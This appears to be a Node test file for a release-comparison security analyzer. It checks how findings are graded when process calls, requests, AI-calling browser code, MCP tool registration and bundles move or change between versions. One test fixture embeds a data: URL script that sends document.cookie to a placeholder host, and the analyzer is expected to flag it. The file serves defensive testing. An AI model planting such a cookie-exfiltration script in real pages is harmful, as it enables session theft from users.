// Release-wide semantics that one-component fixtures cannot show: sites
// moved between components, unread sides, registration API changes,
// embedded scripts, grouped renderer APIs and source-map coverage.
import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { diffApplications } from "../src/diff.mjs";
import { unknownCounterparts } from "../src/moves.mjs";
import { releaseBaseline, releaseMovesOf } from "../src/policy.mjs";
import { app, at, evaluate, fact, range, side } from "./helpers.mjs";

const exec = (module, command) =>
  fact(
    `${module}#execFile`,
    { module, method: "execFile", command, range: range(2, 0, 2, 40) },
    at(module, 2),
  );

// Grades `name` of a release given as { name: [oldApp, newApp] }, with the
// release-wide moves and baseline the compare command gives each component.
const graded = (
  components,
  name,
  { comparable = () => true, surfaces = [] } = {},
) => {
  const prepared = Object.entries(components).map(
    ([component, [old, now]]) => ({
      name: component,
      left: side("v1", old),
      right: side("v2", now),
      diff: { app: diffApplications(old, now) },
      comparable: comparable(component),
    }),
  );
  const release = { moves: releaseMovesOf(prepared) };
  const baseline = releaseBaseline(prepared.map((component) => component.left));
  const [old, now] = components[name];
  return evaluate(side("v1", old), side("v2", now), {
    release,
    baseline,
    name,
    surfaces,
  }).map((finding) => [finding.rule, finding.severity]);
};

describe("sites moved between components", () => {
  const release = {
    core: [app({ childProcesses: [exec("a.js", "/usr/bin/git")] }), app()],
    worker: [app(), app({ childProcesses: [exec("w.js", "/usr/bin/git")] })],
    agent: [app(), app({ childProcesses: [exec("x.js", "/usr/bin/git")] })],
  };

  it("lets one removed site explain one new site, not two", () => {
    const grades = ["worker", "agent"].map((name) => graded(release, name));
    assert.deepEqual(
      grades
        .flat()
        .map(([, severity]) => severity)
        .sort(),
      ["high", "low"],
    );
  });

  it("takes nothing from a component whose new side REA could not analyze", () => {
    assert.deepEqual(
      graded(release, "worker", { comparable: (name) => name !== "core" }),
      [["RW-P01", "high"]],
    );
  });
});

describe("old process sites the new facts lack", () => {
  const GIT = "/usr/bin/git";
  const asset = (key, sha256) => fact(key, { sha256 }, at(key, 1));
  // One component: the old side's a.js runs git; the new side runs it from
  // b.js and ships `files` (path → digest), with REA's coverage `coverage`.
  const moves = (files, { coverage = {}, sites = [] } = {}) => {
    const old = app({
      childProcesses: [exec("a.js", GIT)],
      assets: [asset("a.js", "aa")],
    });
    const now = app({
      childProcesses: [exec("b.js", GIT), ...sites],
      assets: Object.entries(files).map(([key, digest]) => asset(key, digest)),
      coverage: { ...app().coverage, ...coverage },
    });
    return releaseMovesOf([
      {
        name: "app",
        left: side("v1", old),
        right: side("v2", now),
        diff: { app: diffApplications(old, now) },
        comparable: true,
      },
    ]).childProcesses;
  };
  const pairedFrom = (result) =>
    [...result.pairs.values()].map(({ fact: site }) => site.data.module);

  it("pairs a site whose file is gone, or changed and examined, as before", () => {
    for (const files of [{ "b.js": "bb" }, { "a.js": "a2", "b.js": "bb" }])
      assert.deepEqual(pairedFrom(moves(files)), ["a.js"]);
  });

  it("keeps a site in a file the new side still ships unchanged", () => {
    const result = moves({ "a.js": "aa", "b.js": "bb" });
    assert.deepEqual(
      [result.pairs.size, result.lost, result.unknown],
      [0, [], []],
    );
  });

  it("holds a site in a changed file REA examined only in part as unknown", () => {
    const result = moves(
      { "a.js": "a2", "b.js": "bb" },
      { coverage: { semantic_unreached_modules: ["a.js"] } },
    );
    assert.equal(result.pairs.size, 0);
    assert.deepEqual(
      result.unknown.map(({ fact: site }) => site.data.module),
      ["a.js"],
    );
  });

  it("names the unknown sites an unpaired new site may be", () => {
    const partial = { coverage: { semantic_unreached_modules: ["a.js"] } };
    const result = moves({ "a.js": "a2", "b.js": "bb" }, partial);
    const modules = (sites) => sites.map(({ fact: site }) => site.data.module);
    assert.deepEqual(
      modules(unknownCounterparts(result, [exec("b.js", GIT)])),
      ["a.js"],
    );
    // Another command, or a site whose file cannot hold a.js's old content
    // (c.js now holds it), is not that site.
    const other = moves(
      { "a.js": "a2", "b.js": "bb" },
      { ...partial, sites: [exec("c.js", "/bin/sh")] },
    );
    assert.deepEqual(
      modules(unknownCounterparts(other, [exec("c.js", "/bin/sh")])),
      [],
    );
    const copied = moves({ "a.js": "a2", "b.js": "bb", "c.js": "aa" }, partial);
    assert.deepEqual(
      modules(unknownCounterparts(copied, [exec("b.js", GIT)])),
      [],
    );
  });

  it("pairs a site whose file moved to another path only with its copy", () => {
    // c.js holds a.js's old content; REA reported no site there.
    assert.equal(moves({ "b.js": "bb", "c.js": "aa" }).pairs.size, 0);
    const copied = moves(
      { "b.js": "bb", "c.js": "aa" },
      { sites: [exec("c.js", GIT)] },
    );
    assert.deepEqual([...copied.pairs.keys()], [exec("c.js", GIT).node_id]);
  });
});

describe("unresolved requests across components", () => {
  const request = (module) =>
    fact(
      `${module}#fetch`,
      { module, method: "fetch", endpoint: null, range: range(1, 0, 1, 20) },
      at(module, 1),
    );
  const asset = (key, sha256) => fact(key, { sha256 }, at(key, 1));
  const release = (digest) => ({
    web: [
      app({
        requests: [request("lib/ai.js")],
        assets: [asset("lib/ai.js", "aa")],
      }),
      app(),
    ],
    worker: [
      app(),
      app({
        requests: [request("lib/ai.js")],
        assets: [asset("lib/ai.js", digest)],
      }),
    ],
  });
  const prepared = (components) =>
    Object.entries(components).map(([name, [old, now]]) => ({
      name,
      left: side("v1", old),
      right: side("v2", now),
      diff: { app: diffApplications(old, now) },
      comparable: true,
    }));

  it("pairs only when the file moved unchanged", () => {
    for (const [digest, paired] of [
      ["aa", true],
      ["bb", false],
    ]) {
      const moves = releaseMovesOf(prepared(release(digest))).requests;
      assert.equal(moves.pairs.size, paired ? 1 : 0, digest);
    }
  });
});

describe("browser AI code moved between components", () => {
  const OPENAI = "https://api.openai.com/v1/chat/completions";
  const module = "assets/summary.js";
  // The summary bundle, with its OpenAI call, HTML sink and source map.
  const summary = (digest) =>
    app({
      browserModules: new Set([module]),
      assets: [fact(module, { sha256: digest }, at(module, 1))],
      requests: [
        fact(
          `${module}#fetch`,
          {
            module,
            method: "fetch",
            endpoint: OPENAI,
            range: range(6, 2, 6, 40),
          },
          at(module, 6),
        ),
      ],
      endpoints: [fact(OPENAI, { value: OPENAI }, at(module, 6))],
      htmlSinks: [
        fact(
          `${module}#write:/innerHTML`,
          { module, sink: "write:/innerHTML", range: range(21, 2, 21, 30) },
          at(module, 21),
        ),
      ],
      embeddedSources: [
        fact(
          "src/features/summary.ts",
          { original: "src/features/summary.ts", content_sha256: null },
          at(`${module}.map`, 1),
        ),
      ],
    });
  const release = (digest) => ({
    web: [summary("aa"), app()],
    admin: [app(), summary(digest)],
  });

  it("reports nothing new when the file moved unchanged", () => {
    assert.deepEqual(graded(release("aa"), "admin", { surfaces: ["ai"] }), []);
  });

  it("still reports the sink when the moved file changed", () => {
    assert.deepEqual(graded(release("bb"), "admin", { surfaces: ["ai"] }), [
      ["RW-A05", "medium"],
    ]);
  });
});

describe("MCP registration API changes", () => {
  const server = "src/server.js";
  const mcp = (members) =>
    app({
      imports: [
        fact(
          "@modelcontextprotocol/sdk/server/mcp.js",
          {
            specifier: "@modelcontextprotocol/sdk/server/mcp.js",
            module: server,
          },
          at(server, 1),
        ),
      ],
      memberCalls: members.map((member, index) =>
        fact(
          `${server}#read:/${member}`,
          {
            module: server,
            member,
            range: range(10 + index * 10, 0, 18 + index * 10, 2),
          },
          at(server, 10 + index * 10),
        ),
      ),
      bindingReads: [
        fact(
          `${server}#CallToolRequestSchema`,
          {
            module: server,
            name: "CallToolRequestSchema",
            range: range(10, 30, 10, 51),
            binding_range: range(1, 9, 1, 30),
            binding_owner: null,
          },
          at(server, 10),
        ),
      ],
    });

  it("reports a move from a CallTool dispatcher to per-tool registration low, without counts", () => {
    const findings = evaluate(
      side("v1", mcp(["setRequestHandler", "setRequestHandler"])),
      side("v2", mcp(["registerTool", "registerTool", "registerTool"])),
    );
    assert.deepEqual(
      findings.map((finding) => [
        finding.rule,
        finding.severity,
        finding.title,
      ]),
      [["RW-M02", "low", "MCP tool registration API changed"]],
    );
  });
});

describe("pages and renderer APIs", () => {
  it("reports a script whose code is embedded in a data: URL as unexamined code", () => {
    const page = (source) =>
      fact(
        source,
        { script_path: source, resolution_status: "external" },
        at("index.html", 3),
      );
    const findings = evaluate(
      side("v1", app()),
      side(
        "v2",
        app({
          pageScripts: [
            page("data:text/javascript,fetch('//x.example/'+document.cookie)"),
          ],
        }),
      ),
    );
    assert.deepEqual(
      findings.map((finding) => [finding.rule, finding.severity]),
      [["RW-W01", "high"]],
    );
  });

  it("groups new renderer APIs into one finding per component", () => {
    const member = (index) =>
      fact(
        `notes.call${index}`,
        { member: `notes.call${index}`, channel: `notes:call${index}` },
        at("preload.js", index),
        "inferred",
      );
    const findings = evaluate(
      side("v1", app()),
      side("v2", app({ bridgeMembers: [1, 2, 3, 4, 5].map(member) })),
    );
    assert.deepEqual(
      findings.map((finding) => finding.title),
      [
        "New renderer APIs (5): notes.call1(), notes.call2(), notes.call3() and 2 more",
      ],
    );
  });
});

describe("unexamined bundles with source maps", () => {
  const bundle = "dist/cli.cjs";
  const original = (path, digest) =>
    fact(
      path,
      { original: path, content_sha256: digest, bundle },
      at(bundle, 1),
    );
  const failed = (digest, sources) =>
    app({
      assets: [fact(bundle, { sha256: digest }, at(bundle, 1))],
      analysisFailures: [
        fact(
          `failure:${digest}`,
          { code: "resource_constraint", message: "heap" },
          at(bundle, 1),
        ),
      ],
      embeddedSources: sources,
    });
  const severity = (before, after) =>
    evaluate(side("v1", failed("b1", before)), side("v2", failed("b2", after)))
      .filter((finding) => finding.rule === "RW-C01")
      .map((finding) => finding.severity);

  it("stays medium when the source map names no changed original source", () => {
    assert.deepEqual(
      severity(
        [original("../src/cli.ts", "s1")],
        [original("../src/cli.ts", "s1")],
      ),
      ["medium"],
    );
  });

  it("is high and names the changed original source otherwise", () => {
    assert.deepEqual(
      severity(
        [original("../src/cli.ts", "s1")],
        [original("../src/cli.ts", "s2")],
      ),
      ["high"],
    );
  });
});
